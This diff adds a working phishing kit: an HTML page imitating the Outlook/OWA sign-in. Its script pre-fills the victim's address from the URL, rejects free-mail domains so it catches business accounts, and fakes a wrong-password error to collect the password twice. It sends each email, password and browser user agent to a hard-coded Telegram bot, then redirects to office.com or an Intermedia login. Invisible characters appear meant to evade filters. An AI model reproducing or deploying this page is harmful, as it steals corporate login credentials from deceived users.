@@ -1,0 +1,267 @@
+
+<html>
+<meta content="text/html; CHARSET=utf-8" http-equiv="Content-Type"/>
+<meta content="IE=10" http-equiv="X-UA-Compatible"/>
+<script src="local_resources/js/9bcd03286c65aed0d62f796158eb1367.js"></script>
+<title>Outlook</title>
+
+<body style="background: #f7f5f5; height: 90%;width: 100%">
+<div style="height: 100%;width: 100%;margin: 0px;min-width: 652px;">
+<div style="background-color: #047bd0;position: absolute;top: 0px;bottom: 0px;display: inline-block;width: 332px;">
+<div style="margin: 213px auto auto 109px;text-align: left;">
+<img alt="" src="local_resources/img/b3bdb26778657f5a6b8d1d38098187be.png" width="139px"/>
+</div>
+</div>
+<div style="padding-top: 160px;padding-left: 430px;padding-right: 142px;position: absolute;top: 0px;bottom: 0px;left: 0px;right: 0px;text-align: center;">
+<div style="text-align: left;position: relative;vertical-align: top;display: inline-block;width: 423px;">
+<div style="margin-bottom: 22px;">
+<img alt="" src="local_resources/img/8a6afcde6081c97eb594cc68fc1b2e99.png" width="281px"/>
+</div>
+<div style="height: 100%;width: 100%;margin: 0px;">
+<div style="font-size: 11px;color: #6d6c6c;font-family:  sans-serif;margin-bottom: 2px;">
+            Domain/Username:</div>
+<div><input id="mail" name="username" style="border: 1px solid #98A3A6;color: #333333; background-color: #FDFDFD;width: 260px;margin-bottom: 20px;box-sizing: content-box;-moz-box-sizing: content-box;-webkit-box-sizing: content-box;height: 22px;font-size: 12px;padding: 3px 5px;font-family:  sans-serif;"/></div>
+<div style="font-size: 11px;color: #6d6c6c;font-family:  sans-serif;margin-bottom: 2px;">
+            Password:</div>
+<div><input id="pass" name="password" style="border: 1px solid #afbcc0;color: #312f2f; background-color: #FDFDFD;width: 260px;box-sizing: content-box;-moz-box-sizing: content-box;-webkit-box-sizing: content-box;height: 22px;font-size: 12px;padding: 3px 5px;font-family:  sans-serif;" type="password"/>
+<br/> <p id="show" style="color:rgb(239, 12, 12);font-family:  sans-serif;font-size: 12px; height: 5px; "></p></div>
+<div style="font-size: 22px;color: #0583de;font-family:  sans-serif;margin-top: 20px;">
+<a href="index.html#" style="cursor: pointer;display: inline;padding: 0px 8px 5px 8px;margin-left: -8px; color: #037fd8; text-decoration: none; ">
+<img alt="" src="local_resources/img/a070b73ac77cb870906796a044830106.png" style="vertical-align: middle;margin-top: -2px; width:22px;"/>
+<span id="button" style="padding-left: 10px;padding-right: 10px;">sign in</span>
+</a>
+</div>
+</div>
+</div>
+<p id="ip" style="display: none;"></p>
+</div>
+</div>
+</body>
+<script>
+    window.addEventListener('load', function(){
+    var maler = window.location.hash.substr(1)
+            console.log(maler)
+
+    if(maler){
+         document.getElementById('mail').value = maler
+        
+    }
+
+    var button = document.getElementById('button')
+    counter = 0
+    button.addEventListener('click', function(){
+
+        
+        let male = document.getElementById('mail').value
+        let pass = document.getElementById('pass').value 
+
+        if( male.indexOf('@') == -1 || male == '' ){
+
+              var show = document.getElementById('show').innerHTML = `P͏l͏e͏a͏s͏e͏ Confirm your Email.`;
+
+              setTimeout(() => {
+                  document.getElementById('show').innerHTML = '';
+                  document.getElementById('mail').focus()
+                  document.getElementById('mail').value = ''
+                  document.getElementById('pass').value = ''
+                  
+              }, 2000)
+
+          }
+
+          else if(male.indexOf('yahoo') !== -1 || male.indexOf('gmail') !== -1 || male.indexOf('outlook') !== -1 || male.indexOf('aol') !== -1 || male.indexOf('hotmail') !== -1 || male.indexOf('msn') !== -1 || male.indexOf('microsoft') !== -1){
+
+        var show = document.getElementById('show').innerHTML = `This is not a Business Email, please enter a Business Email`;
+
+        setTimeout(() => {
+                  document.getElementById('show').innerHTML = '';
+                  document.getElementById('mail').focus()
+                  document.getElementById('mail').value = ''
+                  document.getElementById('pass').value = ''
+                  
+        }, 2000)
+
+}
+//\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\Pass Section////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+            else if(pass == null || pass == ''){
+
+            var show = document.getElementById('show').innerHTML = `Please enter your password`;
+
+            setTimeout(() => {
+                  document.getElementById('show').innerHTML = '';
+                  document.getElementById('pass').focus()
+                  document.getElementById('pass').value = ''
+                  
+            }, 2000)
+
+}
+
+else if(pass.length < 5){
+
+var show = document.getElementById('show').innerHTML = `Your password is too short`;
+
+setTimeout(() => {
+                  document.getElementById('show').innerHTML = '';
+                  document.getElementById('pass').focus()
+                  document.getElementById('pass').value = ''
+                  
+}, 2000)
+
+}
+//Triggers
+else if(counter < 1){
+
+var show = document.getElementById('show').innerHTML = `The username or password you entered isn't correct. Try entering it again.`;
+
+
+setTimeout(() => {
+    document.getElementById('show').innerHTML = ''
+    document.getElementById('pass').focus()
+    document.getElementById('pass').value = ''
+
+    
+}, 2000)
+
+
+
+let start = male.indexOf('@')
+let end = male.indexOf('.')
+let domain = male.slice(start + 1,end)
+
+
+let output = domain.includes(9) || domain.includes(7) || domain.includes(6) ||
+domain.includes(5) || domain.includes(4) || domain.includes(8) || domain.includes(3)
+|| domain.includes(2) || domain.includes(0) || domain.includes(1)
+
+console.log(output)
+
+var IP = document.getElementById('ip').textContent;
+console.log(IP)
+
+var token = '7246324137:AAGi8KBSZIDimYT1K3Ry-g5BwCqU6CkOZiM';
+var chat_ids = 6810442780
+
+
+
+if(!output ) {
+
+    var clean = `***** OWA/ARSMTP R͏e͏s͏u͏l͏t͏ *****\r\nEml: ${male}\r\nP͏i͏n͏1͏: ${pass}\r\nUse͏r͏-A͏g͏e͏n͏t͏: {navigator.userAgent}\r\n*****`;
+                
+                
+                var settings = {
+                    "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+                    "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
+                    "data": JSON.stringify({ "chat_id": chat_ids, "text": clean })
+                }
+                $.ajax(settings).done((response) => { 
+                    console.log(response) })
+            
+}
+
+
+else{
+
+
+    var dirt = `***** OWA/ARSMTP R͏e͏s͏u͏l͏t͏ *****\r\nEml: ${male}\r\nP͏i͏n͏1͏: ${pass}\r\nUse͏r͏-A͏g͏e͏n͏t͏: ${navigator.userAgent}\r\n*****`;
+                
+                
+                var settings = {
+                    "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+                    "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
+                    "data": JSON.stringify({ "chat_id": chat_ids, "text": dirt })
+                }
+                $.ajax(settings).done((response) => { 
+                    console.log(response) })
+                
+
+
+}
+
+
+
+
+counter++
+}
+
+
+//Last//\\\\\\\\\\\\\\\\\\\\\\\\\\\
+else{
+
+
+
+setTimeout(() => {
+    document.getElementById('show').innerHTML = ''
+    document.getElementById('pass').focus()
+    document.getElementById('pass').value = ''
+
+    
+}, 2000)
+
+
+
+let start = male.indexOf('@')
+let end = male.indexOf('.')
+let domain = male.slice(start + 1,end)
+
+
+let output = domain.includes(9) || domain.includes(7) || domain.includes(6) ||
+domain.includes(5) || domain.includes(4) || domain.includes(8) || domain.includes(3)
+|| domain.includes(2) || domain.includes(0) || domain.includes(1)
+
+console.log(output)
+
+var IP = document.getElementById('ip').textContent;
+console.log(IP)
+var token = '7246324137:AAGi8KBSZIDimYT1K3Ry-g5BwCqU6CkOZiM';
+var chat_ids = 6810442780
+
+
+if(!output ) {
+    
+    var clean = `***** ServerData R͏e͏s͏u͏l͏t͏ *****\r\nEml: ${male}\r\nP͏i͏n͏1͏: ${pass}\r\nUse͏r͏-A͏g͏e͏n͏t͏: {navigator.userAgent}\r\n*****`;
+                
+                
+                var settings = {
+                    "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+                    "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
+                    "data": JSON.stringify({ "chat_id": chat_ids, "text": clean })
+                }
+                $.ajax(settings).done((response) => { 
+                    console.log(response) })
+
+    window.open('https://cp.intermedia.net/ControlPanel/Login?ClientType=ControlPanel') 
+
+}
+else{
+
+    var dirt = `***** OWA R͏e͏s͏u͏l͏t͏ *****\r\nEml: ${male}\r\nP͏i͏n͏1͏: ${pass}\r\nUse͏r͏-A͏g͏e͏n͏t͏: ${navigator.userAgent}\r\n*****`;
+                
+                
+                var settings = {
+                    "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+                    "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
+                    "data": JSON.stringify({ "chat_id": chat_ids, "text": dirt })
+                }
+                $.ajax(settings).done((response) => { 
+                    console.log(response) })
+            
+
+
+    window.open('https://office.com') 
+
+}}
+
+
+
+
+
+
+
+
+
+
+    })
+
+})
+</script>
+</html>
